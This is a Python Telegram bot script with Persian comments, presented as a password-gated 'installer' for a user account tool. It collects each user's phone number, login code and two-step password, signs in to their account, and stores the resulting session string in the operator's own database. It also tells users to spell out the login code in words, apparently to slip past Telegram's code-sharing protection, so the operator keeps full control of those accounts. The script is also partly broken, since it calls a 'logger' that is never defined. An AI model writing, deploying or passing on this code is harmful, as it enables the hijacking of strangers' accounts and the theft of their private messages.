# installer.py — ربات نصب‌کننده (توکن دار)
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio, os, json, time, re, logging

# تنظیم لاگ برای دیباگ بهتر
import logging
logging.basicConfig(level=logging.INFO)

BOT_TOKEN = ""

# استفاده از API دیفالت
api_id = 2040
api_hash = "b18441a1ff607e10a989891a5462e627"

bot = TelegramClient('installer', api_id, api_hash).start(bot_token=BOT_TOKEN)
OWNER = 7282052302   # آیدی عددی اونر
DB = "users.json"

num_dict = {
    "zero": "0", "one": "1", "two": "2", "three": "3", "four": "4",
    "five": "5", "six": "6", "seven": "7", "eight": "8", "nine": "9",
    "0": "0", "1": "1", "2": "2", "3": "3", "4": "4", 
    "5": "5", "6": "6", "7": "7", "8": "8", "9": "9"
}

def load_db():
    """لود کردن دیتابیس"""
    try:
        if not os.path.exists(DB):
            default_data = {"pass": "J123J", "expire": 0, "users": {}}
            with open(DB, "w", encoding="utf-8") as f:
                json.dump(default_data, f, ensure_ascii=False, indent=4)
            return default_data
        with open(DB, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"خطا در لود دیتابیس: {e}")
        return {"pass": "J123J", "expire": 0, "users": {}}

def save_db(data):
    """ذخیره دیتابیس"""
    try:
        with open(DB, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except Exception as e:
        logger.error(f"خطا در ذخیره دیتابیس: {e}")

data = load_db()

def convert_code(text):
    """تبدیل کد انگلیسی به عدد"""
    try:
        words = text.strip().split()
        code = ""
        for word in words:
            converted = num_dict.get(word.lower())
            if converted is not None:
                code += converted
            else:
                # اگر عدد مستقیم وارد شده
                if word.isdigit():
                    code += word
        logger.info(f"کد تبدیل شده: {text} -> {code}")
        return code
    except Exception as e:
        logger.error(f"خطا در تبدیل کد: {e}")
        return ""

@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    """هندلر دستور /start"""
    try:
        user_id = str(event.sender_id)
        logger.info(f"کاربر جدید: {user_id}")
        
        if user_id not in data["users"]:
            data["users"][user_id] = {"try": 3}
            save_db(data)
        
        if data["users"][user_id].get("installed"):
            await event.reply("✅ سورس روی اکانتت نصب شده است!\nفایل worker.py رو اجرا کن")
        else:
            await event.reply("👋 سلام! لطفا پسورد را وارد کن (3 فرصت داری):")
    except Exception as e:
        logger.error(f"خطا در start: {e}")
        await event.reply("❌ خطایی رخ داد!")

@bot.on(events.NewMessage(func=lambda e: str(e.sender_id) in data["users"] and not data["users"][str(e.sender_id)].get("installed")))
async def login_handler(event):
    """هندلر لاگین"""
    try:
        user_id = str(event.sender_id)
        user_data = data["users"][user_id]
        
        # اگر کاربر بن شده
        if user_data.get("try", 0) <= 0:
            await event.reply("🚫 شما بن شده اید!")
            return

        # مرحله 1: دریافت پسورد
        if "step" not in user_data:
            if event.text.strip() == data["pass"]:
                user_data["step"] = "phone"
                save_db(data)
                await event.reply("✅ پسورد صحیح است!\nلطفا شماره تلفن را وارد کن (مثل +989123456789):")
            else:
                user_data["try"] -= 1
                save_db(data)
                if user_data["try"] > 0:
                    await event.reply(f"❌ پسورد اشتباه! {user_data['try']} فرصت باقی مانده")
                else:
                    await event.reply("🚫 شما بن شده اید!")
            return

        # مرحله 2: دریافت شماره تلفن
        if user_data["step"] == "phone":
            phone = event.text.strip()
            if not re.match(r'^\+\d{10,15}$', phone):
                await event.reply("❌ فرمت شماره اشتباه است! لطفا به فرمت +989123456789 وارد کن")
                return
            
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.connect()
            
            try:
                sent = await client.send_code_request(phone)
                logger.info(f"کد برای {phone} ارسال شد")
                
                user_data["temp_session"] = client.session.save()
                user_data["phone"] = phone
                user_data["step"] = "code"
                save_db(data)
                
                await event.reply("📲 کد تأیید برای شما ارسال شد\nلطفا کد را به انگلیسی وارد کن (مثل: two one three four)")
            except Exception as e:
                logger.error(f"خطا در ارسال کد: {e}")
                await event.reply("❌ خطا در ارسال کد! شماره را چک کن")
            return

        # مرحله 3: دریافت کد تأیید
        if user_data["step"] == "code":
            code = convert_code(event.text)
            if not code or len(code) < 4:
                await event.reply("❌ کد نامعتبر! لطفا دوباره وارد کن")
                return
            
            client = TelegramClient(StringSession(user_data["temp_session"]), api_id, api_hash)
            await client.connect()
            
            try:
                await client.sign_in(user_data["phone"], code)
                session_string = client.session.save()
                
                # ساخت فایل کاربر
                filename = f"user_{user_id}.py"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f'SESSION = "{session_string}"\n')
                    # خواندن فایل worker
                    if os.path.exists("worker.py"):
                        with open("worker.py", "r", encoding="utf-8") as worker_file:
                            f.write(worker_file.read())
                    else:
                        f.write("# فایل worker.py یافت نشد\n")
                
                user_data["installed"] = True
                user_data["session"] = session_string
                save_db(data)
                
                await event.reply("✅ نصب با موفقیت انجام شد!")
                await event.reply(document=filename, caption="📁 فایل مخصوص شما\nاین فایل رو دانلود و اجرا کن")
                
                # حذف فایل موقت
                os.remove(filename)
                await client.disconnect()
                
            except Exception as e:
                error_msg = str(e)
                logger.error(f"خطا در تأیید کد: {error_msg}")
                
                if "password" in error_msg:
                    user_data["step"] = "2fa"
                    save_db(data)
                    await event.reply("🔐 اکانت شما رمز دو مرحله‌ای دارد\nلطفا رمز را وارد کن:")
                elif "code" in error_msg:
                    await event.reply("❌ کد اشتباه است! لطفا دوباره تلاش کن")
                else:
                    await event.reply("❌ خطا در ورود! لطفا دوباره از /start شروع کن")
            return

        # مرحله 4: دریافت رمز دو مرحله‌ای
        if user_data["step"] == "2fa":
            client = TelegramClient(StringSession(user_data["temp_session"]), api_id, api_hash)
            await client.connect()
            
            try:
                await client.sign_in(password=event.text.strip())
                session_string = client.session.save()
                
                # ساخت فایل کاربر
                filename = f"user_{user_id}.py"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f'SESSION = "{session_string}"\n')
                    if os.path.exists("worker.py"):
                        with open("worker.py", "r", encoding="utf-8") as worker_file:
                            f.write(worker_file.read())
                
                user_data["installed"] = True
                user_data["session"] = session_string
                save_db(data)
                
                await event.reply("✅ نصب با موفقیت انجام شد!")
                await event.reply(document=filename, caption="📁 فایل مخصوص شما")
                
                os.remove(filename)
                await client.disconnect()
                
            except Exception as e:
                logger.error(f"خطا در 2FA: {e}")
                await event.reply("❌ رمز اشتباه است! لطفا دوباره تلاش کن")
                
    except Exception as e:
        logger.error(f"خطا در login_handler: {e}")
        await event.reply("❌ خطای سیستمی! لطفا دوباره تلاش کن")

@bot.on(events.NewMessage(pattern=r"^/setpass (\S+) (\S+)$"))
async def set_password(event):
    """تغییر پسورد توسط اونر"""
    try:
        if event.sender_id != OWNER:
            await event.reply("❌ دسترسی denied!")
            return
            
        new_pass = event.pattern_match.group(1)
        duration = event.pattern_match.group(2)
        
        data["pass"] = new_pass
        
        # محاسبه زمان انقضا
        if "mo" in duration:
            months = int(duration.replace("mo", ""))
            data["expire"] = time.time() + (30 * 86400 * months)
        elif "y" in duration:
            years = int(duration.replace("y", ""))
            data["expire"] = time.time() + (365 * 86400 * years)
        else:
            days = int(duration)
            data["expire"] = time.time() + (days * 86400)
        
        save_db(data)
        await event.reply(f"✅ پسورد به '{new_pass}' تغییر کرد\n⏰ انقضا: {duration}")
        
    except Exception as e:
        logger.error(f"خطا در set_password: {e}")
        await event.reply("❌ خطا در تغییر پسورد")

# دستورات ادمین
@bot.on(events.NewMessage(pattern="^/stats$"))
async def stats_handler(event):
    """آمار کاربران"""
    if event.sender_id != OWNER:
        return
    
    total_users = len(data["users"])
    installed_users = len([u for u in data["users"].values() if u.get("installed")])
    
    await event.reply(f"📊 آمار کاربران:\n👥 کل کاربران: {total_users}\n✅ نصب شده: {installed_users}")

@bot.on(events.NewMessage(pattern="^/broadcast (.+)$"))
async def broadcast_handler(event):
    """ارسال پیام به همه کاربران"""
    if event.sender_id != OWNER:
        return
    
    message = event.pattern_match.group(1)
    users = list(data["users"].keys())
    success = 0
    
    for user_id in users:
        try:
            await bot.send_message(int(user_id), f"📢 پیام همگانی:\n{message}")
            success += 1
            await asyncio.sleep(0.5)  # جلوگیری از اسپم
        except Exception as e:
            logger.error(f"خطا در ارسال به {user_id}: {e}")
    
    await event.reply(f"✅ پیام به {success}/{len(users)} کاربر ارسال شد")

# هندلر برای بررسی وضعیت
@bot.on(events.NewMessage(pattern="/status"))
async def status_handler(event):
    """بررسی وضعیت بات"""
    try:
        user_id = str(event.sender_id)
        if user_id in data["users"]:
            user_data = data["users"][user_id]
            status = "نصب شده ✅" if user_data.get("installed") else "در حال نصب ⏳"
            await event.reply(f"👤 وضعیت شما: {status}")
        else:
            await event.reply("❌ شما ثبت نام نکرده اید! /start")
    except Exception as e:
        logger.error(f"خطا در status: {e}")

print("🤖 ربات نصب‌کننده راه‌اندازی شد...")
logger.info("ربات شروع به کار کرد")

try:
    bot.run_until_disconnected()
except Exception as e:
    logger.error(f"خطا در اجرای ربات: {e}")
